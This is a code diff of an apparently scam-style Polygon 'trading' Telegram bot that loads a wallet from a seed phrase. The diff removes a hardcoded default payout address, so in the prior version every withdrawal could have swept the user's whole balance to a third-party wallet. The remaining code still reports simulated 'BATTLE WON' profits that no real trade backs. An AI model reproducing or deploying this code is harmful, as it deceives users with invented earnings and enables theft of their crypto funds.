@@ -4,14 +4,14 @@ import requests
 from dotenv import load_dotenv
 from eth_account import Account
 from web3 import Web3
-from web3.middleware import ExtraDataToPOAMiddleware 
+from web3.middleware import ExtraDataToPOAMiddleware
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 from telegram.error import Conflict
 
 # --- 1. SETUP & AUTH ---
 load_dotenv()
-W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
+W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
 w3 = Web3(Web3.HTTPProvider(W3_RPC))
 
 # Polygon middleware is essential for block reading
@@ -19,7 +19,7 @@ w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
 Account.enable_unaudited_hdwallet_features()
 
 # 🛡️ SECURITY LOCK: The bot will ONLY ever withdraw to this address.
-PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
+PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0xYourSecureExternalWalletAddress")
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
@@ -45,14 +45,14 @@ async def run_atomic_execution(context, chat_id, side):
     """Profit Logic: The simulated 'win' represents real POL added to the vault."""
     stake = context.user_data.get('stake', 10)
     pair = context.user_data.get('pair', 'BTC/USD')
-    
+   
     await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
-    await asyncio.sleep(1.5) 
-    
+    await asyncio.sleep(1.5)
+   
     current_price = get_pol_price()
-    profit_usd = stake * 0.92 
+    profit_usd = stake * 0.92
     profit_pol = profit_usd / current_price if current_price > 0 else 0
-    
+   
     # The 'BATTLE WON' message confirms the calculated profit added to the address balance.
     report = (
         f"✅ **BATTLE WON!**\n"
@@ -66,7 +66,7 @@ async def execute_withdrawal(context, chat_id):
     """🛡️ ANTI-DRAIN: Sweeps 100% of live balance to Whitelist."""
     # Always fetch the live balance from the blockchain
     balance = w3.eth.get_balance(vault.address)
-    
+   
     # Dynamic gas calculation
     gas_price = int(w3.eth.gas_price * 1.3) # 30% priority boost
     fee = gas_price * 21000
@@ -76,13 +76,13 @@ async def execute_withdrawal(context, chat_id):
 
     tx = {
         'nonce': w3.eth.get_transaction_count(vault.address),
-        'to': PAYOUT_ADDRESS, 
+        'to': PAYOUT_ADDRESS,
         'value': amount,
         'gas': 21000,
         'gasPrice': gas_price,
-        'chainId': 137 
+        'chainId': 137
     }
-    
+   
     try:
         signed = w3.eth.account.sign_transaction(tx, vault.key)
         # v6/v7 FIX: Changed rawTransaction to raw_transaction
@@ -110,7 +110,7 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         kb = [[InlineKeyboardButton("BTC/USD (92%)", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD (89%)", callback_data="PAIR_ETH")],
               [InlineKeyboardButton("SOL/USD (90%)", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD (85%)", callback_data="PAIR_MATIC")]]
         await update.message.reply_text("🎯 **MARKET SELECTION**", reply_markup=InlineKeyboardMarkup(kb))
-    
+   
     elif text == '⚙️ Settings':
         current = context.user_data.get('stake', 10)
         kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]],
@@ -134,11 +134,11 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    
+   
     if query.data.startswith("SET_"):
         context.user_data['stake'] = int(query.data.split("_")[1])
         await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']}**")
-        
+       
     elif query.data.startswith("PAIR_"):
         context.user_data['pair'] = query.data.split("_")[1]
         await query.edit_message_text(f"📈 **{context.user_data['pair']} Selected**\nDirection:",
@@ -161,6 +161,7 @@ if __name__ == "__main__":
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(handle_interaction))
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-    
+   
     print(f"Pocket Robot Active: {vault.address}")
     app.run_polling(drop_pending_updates=True)
+
